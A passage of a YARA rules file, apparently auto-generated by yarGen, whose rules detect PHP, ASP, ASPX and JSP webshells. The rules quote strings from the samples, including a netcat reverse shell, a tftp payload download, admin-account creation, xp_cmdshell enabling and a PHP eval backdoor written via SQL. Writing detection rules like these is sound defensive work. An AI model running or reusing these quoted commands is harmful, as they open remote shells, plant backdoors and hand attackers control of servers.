}

rule _r00ts_php_icesword_silic_ghost_source_10 {
   meta:
      description = "webshell - from files r00ts php.php, icesword.php, silic.php, ghost_source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8dafcd59e326fb8b5d5a54243e4beca182eb230c45e73064ee4acbfd3d302ead"
      hash2 = "adf16adeffb5b05dda9e3588f06dba46fcd520c33f113ec0090cd4cda82b8b11"
      hash3 = "8f00d641fc0655d989b3c6abaf414266f1a2c877be5ada07b4265aa069729aca"
      hash4 = "a423ef2bec4f1c75d49c6eeb2b6aa38128dae2afcf6e0e7ebfe196833ea43a78"
   strings:
      $x1 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x2 = "Str[12] = \"sp_makewebtask @outputfile='d:\\\\\\\\web\\\\\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)" ascii
      $x3 = "Str[12] = \"sp_makewebtask @outputfile='d:\\\\\\\\web\\\\\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)" ascii
      $s4 = "if(file_exists(\"c:\\\\windows\\\\system32\\\\\")) $dir=\"c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\mysqlDll.dll\";" fullword ascii
      $s5 = "elseif(file_exists(\"c:\\\\winnt\\\\system32\\\\\")) $dir=\"c:\\\\\\\\winnt\\\\\\\\system32\\\\\\\\mysqlDll.dll\"; " fullword ascii
      $s6 = "Str[6] = \"Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll');\";" fullword ascii
      $s7 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $s8 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
      $s9 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $s10 = "$process = proc_open($cmd, $descriptorspec, $pipes, $cwd, $env);" fullword ascii
      $s11 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $s12 = "elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $s13 = "function Exec_Run($cmd)" fullword ascii
      $s14 = "$query = \"SELECT udf FROM udf_temp INTO DUMPFILE '\".$dir.\"';\" ;" fullword ascii
      $s15 = ".\"\\r\\n\".\"-HomeDir=c:\\\\\\r\\n\".\"-LoginMesFile=\\r\\n\".\"-Disable=0\\r\\n\".\"-RelPaths=1\\r\\n\".\"-NeedSecure=0\\r\\n" ascii
      $s16 = "$sendbuf = \"site exec \".$_POST[\"SUCommand\"].\"\\r\\n\";" fullword ascii
      $s17 = "$mhost = $_POST['mhost']; $muser = $_POST['muser']; $mpass = $_POST['mpass']; $mdata = $_POST['mdata']; $mport = $_POST['mport']" ascii
      $s18 = "if(isset($_POST['mhost']) && isset($_POST['muser']))" fullword ascii
      $s19 = "$mhost = $_POST['mhost']; $muser = $_POST['muser']; $mpass = $_POST['mpass']; $mdata = $_POST['mdata']; $mport = $_POST['mport']" ascii
      $s20 = "if(isset($_POST['host']) && isset($_POST['port']))" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x6540 ) and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _11_aspxspy_aspx_11 {
   meta:
      description = "webshell - from files 11.aspx, aspxspy.aspx, aspx.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f09b8567e0aa79ab9b223019b3f67cf98fe7dd2ffcab881e1421adf6f9e4c5b0"
      hash2 = "fca2eae39f4009790408335b71d773b02890a08b581c6ff6bb32def585020abf"
      hash3 = "51d564b700c985fd7aba31ed6a0b8f7b7ddaa7a2adcdaf8d649adb2641ade061"
   strings:
      $x1 = "            <asp:TextBox ID=\"Bin_SucmdTextBox\" runat=\"server\" Width=\"447px\">cmd.exe /c net user</asp:TextBox><br />" fullword ascii
      $x2 = "        string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDi" ascii
      $s3 = "        string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDi" ascii
      $s4 = "_OACreate','odsole70.dll')\\\">Add sp_oacreate<option value=\\\"Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll')" ascii
      $s5 = "                    CmdPath : &nbsp;<asp:TextBox ID=\"Bin_CmdPathTextBox\" runat=\"server\" Width=\"395px\">C:\\Windows\\System3" ascii
      $s6 = "change=if(this.value!='')Command('changedata',this);><option>SQL Server Exec<option value=\\\"Use master dbcc addextendedproc ('" ascii
      $s7 = "<i>&lt;dir&gt;</i></b></td><td>\" + Directory.GetLastWriteTime(Bin_path + \"/\" + Bin_folder.Name) + \"</td><td><a href=javascri" ascii
      $s8 = "avascript:Command('deldir','\" + foldername + \"');>Del</a></td>\";" fullword ascii
      $s9 = "and('showatt','\" + filename + \"');>Att</a>|<a href=javascript:Command('del','\" + filename + \"');>Del</a></td>\";" fullword ascii
      $s10 = "nd('rename','\" + filename + \"');>Ren</a>|<a href=javascript:Command('down','\" + filename + \"');>Down</a>|<a href=javascript:" ascii
      $s11 = "ommand('renamedir','\" + foldername + \"');>Ren</a>|<a href=javascript:Command('showatt','\" + foldername + \"/');>Att</a>|<a hr" ascii
      $s12 = "path + \"/\" + Bin_file.Name) + \"</td><td><a href=javascript:Command('edit','\" + filename + \"');>Edit</a>|<a href=javascript:" ascii
      $s13 = "                    CmdPath : &nbsp;<asp:TextBox ID=\"Bin_CmdPathTextBox\" runat=\"server\" Width=\"395px\">C:\\Windows\\System3" ascii
      $s14 = "                    iisinfo += \"<TD><a href=javascript:Command('change','\" + formatpath(newdir1.Properties[\"Path\"].Value.ToS" ascii
      $s15 = "        InfoLabel.Text += Bin_Process() + \"<hr>\";" fullword ascii
      $s16 = "            file += \"<a href=javascript:Command('change','\" + formatpath(drivers[i]) + \"');>\" + drivers[i] + \"</a>&nbsp;\";" ascii
      $s17 = "3C256578656375746520726571756573742822422229253E" ascii /* hex encoded string '<%execute request("B")%>' */
      $s18 = "    public void Bin_ExecSql(string instr) " fullword ascii
      $s19 = "                tmpstr += \"<td><a href=javascript:Command('change','\" + foldername + \"')>\" + Bin_folder.Name + \"</a></td><t" ascii
      $s20 = "                    iisinfo += \"<TD><a href=javascript:Command('change','\" + formatpath(newdir1.Properties[\"Path\"].Value.ToS" ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_4_0__1___2012_12 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, 4.0 (1).asp, _2012.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash5 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
   strings:
      $s1 = "ion='http://www.baidu.com/ips8.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFF" ascii
      $s2 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
      $s3 = "    TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls" ascii
      $s4 = " txen emuser rorre no" fullword ascii /* reversed goodware string 'on error resume next ' */
      $s5 = "    TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls" ascii
      $s6 = "surivitna" fullword ascii /* reversed goodware string 'antivirus' */
      $s7 = "nottuboidar" fullword ascii /* reversed goodware string 'radiobutton' */
      $s8 = "noitcennoC.BDODA" fullword ascii /* reversed goodware string 'ADODB.Connection' */
      $s9 = "esolC.maerts" fullword ascii /* reversed goodware string 'stream.Close' */
      $s10 = "neht rre fi" fullword ascii /* reversed goodware string 'if err then' */
      $s11 = "efasnu" fullword ascii /* reversed goodware string 'unsafe' */
      $s12 = "\\eciveD\\" fullword ascii /* reversed goodware string '\\Device\\' */
      $s13 = "gnisir" fullword ascii /* reversed goodware string 'rising' */
      $s14 = "neddih" fullword ascii /* reversed goodware string 'hidden' */
      $s15 = "tacmot" fullword ascii /* reversed goodware string 'tomcat' */
      $s16 = "rotartsinimdA" fullword ascii /* reversed goodware string 'Administrator' */
      $s17 = "response.Redirect str1&\"killdoor.asp\"" fullword ascii
      $s18 = "ezimodnaR" fullword ascii /* reversed goodware string 'Randomize' */
      $s19 = ">mrof/<>p/<" fullword ascii /* reversed goodware string '</p></form>' */
      $s20 = "revreS swodniW" fullword ascii /* reversed goodware string 'Windows Server' */
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _2014__2013_13 {
   meta:
      description = "webshell - from files 2014.asp, .asp, 2013.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash2 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash3 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
   strings:
      $x1 = "j SI&\"</tr></table></div><script>var container = new Array(\"\"linklist2\"\"); var objects = new Array(); var links = new Array" ascii
      $s2 = "execute(king(\"trgetr=tktivnfQeY" fullword ascii
      $s3 = "execute(king(\"kqtsZ.kkS:fgozhokeltW.kkS p ftiJ kkS XC" fullword ascii
      $s4 = "* 100) / 100 & \"K\":end if:If theSize >= 0 And theSize <1024 Then :getTheSize = theSize & \"B\":end if:End Function:function op" ascii
      $s5 = "ar obj = evt.target || evt.srcElement; for(r=0; r<links.length; r++) { if(obj == links[r][\"\"object\"\"]) { links[r][\"\"defaul" ascii
      $s6 = "e) { var evt = e || window.event; var obj = evt.target || evt.srcElement; for(r=0; r<links.length; r++) { if(obj == links[r][\"" ascii
      $s7 = "execute(king(\"`>ktzfte<>'19'=ziuoti rz<>kz<>ktzfte/<>q/<>zfgy/<>w/<)!" fullword ascii
      $s8 = "execute(king(\"yo rfS" fullword ascii
      $s9 = "execute(king(\"`>kz/<>rz/<`&)`SNQKJXBU_NSINSU`(ltswqokqIktcktU.zltxjtN&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<" fullword ascii
      $s10 = "execute(king(\")`>ktzfte/<>qtkqzbtz/<`(p: ssqrqtk.zxgrzl.))`rde`(zltxjtk&`e/ `&)`brde`(zltxjtk(etbt.fiszhokeUg p: yo rft" fullword ascii
      $s11 = "execute(king(\"`>tswqz/<>rz/<>' " fullword ascii
      $s12 = "execute(king(\"yo rft:`>``'`&izqYktvgY&`=izqYktvgY&9=thnJtcqU&ktvgYtcqU=fgozeQ?'=ytki.fgozqegs``=aeosefg " fullword ascii
      $s13 = "execute(king(\"`>tswqz/<`&9CU&0CU&1CU&CU p" fullword ascii
      $s14 = "execute(king(\"`>dkgy/<" fullword ascii
      $s15 = ":openUrl=\"/\"&theUrl&\"\"\" target=\"\"_blank\":Else:openUrl=\"###\"\" onclick=\"\"alert('" fullword ascii
      $s16 = "fcol = getPseudoRule(container[i], \"\"td\"\");  var hovcol = getPseudoRule(container[i], \"\"td:hover\"\"); if(defcol.charAt(0)" ascii
      $s17 = "execute(king(\"tszoJkzl = tszoJnTztu:)izqYktvgY,ltzxwokzzQ.tfBtiz(ltzxwokzzQztu & ` :" fullword ascii
      $s18 = "execute(king(\"ol p" fullword ascii
      $s19 = "execute(king(\" zsxltk = etrbti" fullword ascii
      $s20 = "execute(king(\"ufoizgG = tsoXtiz ztU:)izqYktvgY,tsoXtiz(tszoJnTztu p:)izqYktvgY(tsoXztE.Lgly = tsoXtiz ztU:)``,````,izqYktvgY(te" ascii
   condition:
      ( ( uint16(0) == 0x6f3c or uint16(0) == 0x253c ) and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _silic_ghost_source_14 {
   meta:
      description = "webshell - from files silic.php, ghost_source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8f00d641fc0655d989b3c6abaf414266f1a2c877be5ada07b4265aa069729aca"
      hash2 = "a423ef2bec4f1c75d49c6eeb2b6aa38128dae2afcf6e0e7ebfe196833ea43a78"
   strings:
      $s1 = "$wcpth=$_POST['wcpth'] ? $_POST['wcpth']:'cmd.exe';" fullword ascii
      $s2 = "$oralink=OCILogon($orauser,$orapass,\"(DEscriptION=(ADDRESS=(PROTOCOL =TCP)(HOST=$orahost)(PORT = $oraport))(CONNECT_DATA =(SID=" ascii
      $s3 = "$oralink=OCILogon($orauser,$orapass,\"(DEscriptION=(ADDRESS=(PROTOCOL =TCP)(HOST=$orahost)(PORT = $oraport))(CONNECT_DATA =(SID=" ascii
      $s4 = "(ip)\",\"<a href=\\\"http://\".$_SERVER['SERVER_NAME'].\"\\\" target=\\\"_blank\\\">\".$_SERVER['SERVER_NAME'].\"</a>:\".$_SERVE" ascii
      $s5 = "$SCAN_TYPE = isset($_POST['sft']) ? $_POST['sft'] : '.mp3|.mp4|.avi|.swf|.jpg|.gif|.png|.bmp|.gho|.rar|.exe|.zip|.pdf|.dll|.exe|" ascii
      $s6 = "$SCAN_TYPE = isset($_POST['sft']) ? $_POST['sft'] : '.mp3|.mp4|.avi|.swf|.jpg|.gif|.png|.bmp|.gho|.rar|.exe|.zip|.pdf|.dll|.exe|" ascii
      $s7 = "Shell.Users" fullword ascii
      $s8 = "if($_POST['ch']='ch' && $oldps==$password && !empty($_POST['newps']))" fullword ascii
      $s9 = "$conn=\"host=\".$pghost.\" port=\".$pgport.\" dbname=\".$pgdb.\" user=\".$pguser.\" password=\".$pgpass;" fullword ascii
      $s10 = "<a href=\"http://nana.blackbap.org/?p=archive&id=55\" target=\"_blank\">[" fullword ascii
      $s11 = "\",Info_Fun(\"ftp_login\"))," fullword ascii
      $s12 = "$shell = new COM(\"Shell.Users\");" fullword ascii
      $s13 = "(ip)\",\"<a href=\\\"http://\".$_SERVER['SERVER_NAME'].\"\\\" target=\\\"_blank\\\">\".$_SERVER['SERVER_NAME'].\"</a>:\".$_SERVE" ascii
      $s14 = "if(md5($passt) == md5($password)){die('<meta http-equiv=\"refresh\" content=\"1;URL=?\">');}" fullword ascii
      $s15 = "if($_POST['dump']=='dump'){" fullword ascii
      $s16 = ",Shellcode" fullword ascii
      $s17 = "if($system==\"WIN\"){$env=array('path' => 'c:\\\\windows\\\\system32');}" fullword ascii
      $s18 = "}elseif($_GET['winshell']=='shelluser'){" fullword ascii
      $s19 = "$cmd->changePassword($wpasw,\"\");" fullword ascii
      $s20 = "<form action=\"?s=jk&winshell=shelluser\" method=\"POST\">" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x6540 ) and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _icesword_silic_ghost_source_15 {
   meta:
      description = "webshell - from files icesword.php, silic.php, ghost_source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "adf16adeffb5b05dda9e3588f06dba46fcd520c33f113ec0090cd4cda82b8b11"
      hash2 = "8f00d641fc0655d989b3c6abaf414266f1a2c877be5ada07b4265aa069729aca"
      hash3 = "a423ef2bec4f1c75d49c6eeb2b6aa38128dae2afcf6e0e7ebfe196833ea43a78"
   strings:
      $x1 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(r" ascii
      $x2 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(r" ascii
      $x3 = "echo Exec_Run('/tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x4 = "echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : " ascii
      $x5 = "Str[11] = \"tftp -i 123.234.222.1 get silic.exe c:\\\\silic.exe\";" fullword ascii
      $x6 = "echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : " ascii
      $s7 = "Str[10] = \"Exec master.dbo.xp_cmdshell 'net user';\";" fullword ascii
      $s8 = "  if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))" fullword ascii
      $s9 = "if(@mysql_connect($_POST['mhost'].':'.$_POST['mport'],$_POST['muser'],$_POST['mpass']))" fullword ascii
      $s10 = "'=>'Process.GetProcesses','aspx" fullword ascii
      $s11 = ": site exec <font color=#006600>\".$_POST[\"SUCommand\"].\"</font> <br>\";" fullword ascii
      $s12 = " (nc -l -n -v -p '.$_POST['yourport'].') </div>';" fullword ascii
      $s13 = "Str[3] = \"GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;\";" fullword ascii
      $s14 = " <input name=\"SUCommand\" type=\"text\" value=\"net user silic silic /add & net localgroup administrators silic /add\" style=\"" ascii
      $s15 = " <input name=\"SUCommand\" type=\"text\" value=\"net user silic silic /add & net localgroup administrators silic /add\" style=\"" ascii
      $s16 = "<a href=\"?s=e&fp='.urlencode($sp).'&fn='.$Filename.'&dim='.urlencode($key).'\" target=\"_blank\"> " fullword ascii
      $s17 = "633A5C5C626F6F742E696E69" ascii /* hex encoded string 'c:\\boot.ini' */
      $s18 = "<option value=\"10\">xp_cmdshell exec</option>" fullword ascii
      $s19 = "$Port_ip = isset($_POST['ip']) ? $_POST['ip'] : '127.0.0.1';" fullword ascii
      $s20 = "Str[2] = \"select '<?php eval(\\$_POST[cmd]);?>' into outfile 'F://a.php';\";" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x6540 ) and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _c5_m_he1p_1_nogfw_JspSpy1_403_luci_jsp_spy2009_queryDong_a_JspSpyJDK5_JspSpyJDK51_u_000_t00ls1_css_807_jspspy_k8_jspspy_t00_16 {
   meta:
      description = "webshell - from files c5.jsp, m.jsp, he1p.jsp, 1.jsp, nogfw.jsp, JspSpy1.jsp, 403.jsp, luci.jsp.spy2009.jsp, queryDong.jsp, a.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, u.jsp, 000.jsp, t00ls1.jsp, css.jsp, 807.jsp, jspspy_k8.jsp, jspspy.jsp, t00ls.jsp, ma3.jsp, spyjsp2010.jsp, ok.jsp, style.jsp, cofigrue.jsp, dm.jsp, xia.jsp, x7.jsp, mmym520.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
      hash2 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
      hash3 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
      hash4 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
      hash5 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
      hash6 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
      hash7 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
      hash8 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
      hash9 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
      hash10 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
      hash11 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
      hash12 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
      hash13 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
      hash14 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
      hash15 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
      hash16 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
      hash17 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
      hash18 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
      hash19 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
      hash20 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
      hash21 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
      hash22 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
      hash23 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
      hash24 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
      hash25 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
      hash26 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
      hash27 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
      hash28 = "30e33036efcafcca023954308dfb75b7b3a48c4b9d3cdf776943f6479f559235"
      hash29 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
   strings:
      $x1 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"+" fullword ascii
      $x2 = "<a href=\\\"javascript:doPost({o:'vs'});\\\">Execute Command</a> | \"+" fullword ascii
      $s3 = "ins.put(\"executesql\",new ExecuteSQLInvoker());" fullword ascii
      $s4 = "Object obj = ((DBOperator)dbo).execute(sql);" fullword ascii
      $s5 = "ins.put(\"vLogin\",new VLoginInvoker());" fullword ascii
      $s6 = "out.println(\"<form action=\\\"\"+SHELL_NAME+\"\\\" method=\\\"post\\\" target=\\\"echo\\\" onsubmit=\\\"$('cmd').focus()\\\">\"" ascii
      $s7 = "ins.put(\"login\",new LoginInvoker());" fullword ascii
      $s8 = "<a href=\\\"javascript:doPost({o:'vd'});\\\">Download Remote File</a> | \"+" fullword ascii
      $s9 = "public Process getPro(){" fullword ascii
      $s10 = "ins.put(\"shell\",new ShellInvoker());" fullword ascii
      $s11 = "<a href=\\\"javascript:doPost({o:'vbc'});\\\">Back Connect</a> | \"+" fullword ascii
      $s12 = "<form action=\\\"\"+SHELL_NAME+\"\\\" method=\\\"post\\\" onsubmit=\\\"this.submit();$('cmd').value='';return false;\\\" target=" ascii
      $s13 = "\"<h2>Execute Shell &raquo;</h2>\"+" fullword ascii
      $s14 = "private static class ExecuteSQLInvoker extends DefaultInvoker{" fullword ascii
      $s15 = "(new StreamConnector(process.getInputStream(), socket.getOutputStream())).start();" fullword ascii
      $s16 = "var name = prompt('Input Target File Name (Only Support Zip)',tmpName);\"+" fullword ascii
      $s17 = "<td><a href=\\\"javascript:doPost({o:'logout'});\\\">Logout</a> | \"+" fullword ascii
      $s18 = "var savefilename = prompt('Input Target File Name(Only Support ZIP)','pack.zip');\"+" fullword ascii
      $s19 = "(new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();" fullword ascii
      $s20 = "ins.put(\"script\",new ScriptInvoker());" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _b374k_2_8_source_b374k_2_7_source_17 {
   meta:
      description = "webshell - from files b374k-2.8.source.php, b374k-2.7.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8c30f0ad13f188cb24481bc28512e8f71fd4188d6c6020cfe0c26f43a8233d91"
      hash2 = "d31034d5e4fd8d5d8efe640c4d2aa7ac43c71989f84fb4e92606a18563b3fd5e"
   strings:
      $s1 = "// https://github.com/ded/domready - domready (c) Dustin Diaz" fullword ascii
      $s2 = "if(trim($s_res)=='') $s_result = notif(\"Error getting process list\");" fullword ascii
      $s3 = "<?php if(isset($_GP['login'])) echo \"if(d.getElementById('login')) d.getElementById('login').focus();\"; ?>" fullword ascii
      $s4 = "// resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_js $s_rs_c $s_rs_java $s_rs_java $s_rs_win $s_rs_php this was used with bind and r" ascii
      $s5 = "setcookie($s, $$s ,time() + $s_login_time);" fullword ascii
      $s6 = "$s_res = exe(\"gcc \".$s_script.\".c -o \".$s_scriptout.$s_evaloption);" fullword ascii
      $s7 = "elseif($s_sqltype == 'oracle') return oci_execute(oci_parse($s_con, $s_query));" fullword ascii
      $s8 = "// http://www.kryogenix.org/code/browser/sorttable/ - SortTable (c) Stuart Langridge" fullword ascii
      $s9 = "if(strpos($s_cek,\"usage\")!==false) $ver = exe(\"perl -e \\\"print \\$]\\\"\");" fullword ascii
      $s10 = "$s_ver = exe(\"lwp-download --version\");" fullword ascii
      $s11 = "if(strpos($s_cek,\"usage\")!==false) $ver = str_replace(\"\\n\", \", \", exe(\"java -version\"));" fullword ascii
      $s12 = "$s_ver = exe(\"wget --version\");" fullword ascii
      $s13 = "if(!$s_d = getenv(\"TEMP\")) if(!$s_d = getenv(\"TMP\")) if(!$s_d = getenv(\"TMPDIR\")){" fullword ascii
      $s14 = "rLBsTo6wxdOsCdk7lIZiF7mnw+E3FrjaiNW+p4ey+yIRc3XauK00rgrnwRE5OQQO4v1CjGAqFdK0x945o4X3vdD8VRZnvTAPNxvG6UswAtMjEZjcbRVY9fYxbA376DNF" ascii
      $s15 = "if(function_exists(\"posix_kill\")) $s_buff .= (posix_kill($s_p,'9'))? notif(\"Process with pid \".$s_p.\" has been successfully" ascii
      $s16 = "if(file_put_contents($s_script, $s_code)!==false){" fullword ascii
      $s17 = "if(file_put_contents($s_script.\".c\", $s_code)!==false){" fullword ascii
      $s18 = "while($s_se = fgets($s_pipes[2])) {" fullword ascii
      $s19 = "global $s_wget, $s_lwpdownload, $s_lynx, $s_curl;" fullword ascii
      $s20 = "$s_result .= notif(\"[\".$s_sql['type'].\"] \".$s_sql['user'].\"@\".$s_sql['host'].$s_sqlport.\"" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _NEW_WebShell__1__NEW_WebShell__1___2014_10_23_14_54_16_NEW_WebShell_18 {
   meta:
      description = "webshell - from files NEW WebShell (1).asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, NEW WebShell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash2 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash3 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
   strings:
      $s1 = "rrs\"<center><div style='width:60%;padding:1px;'><a href=\"&siteurl&\" target=_blank>\"&loginad&\"</a><br><a href='javascript:hi" ascii
      $s2 = "rrs\"<center><div style='width:60%;padding:1px;'><a href=\"&siteurl&\" target=_blank>\"&loginad&\"</a><br><a href='javascript:hi" ascii
      $s3 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=Cmd1Shell' target='FileFrame'><b>->" fullword ascii
      $s4 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=hiddenshell' target='FileFrame'><b>->" fullword ascii
      $s5 = "raelc.rre" fullword ascii /* reversed goodware string 'err.clear' */
      $s6 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=ReadREG' target='FileFrame'>->" fullword ascii
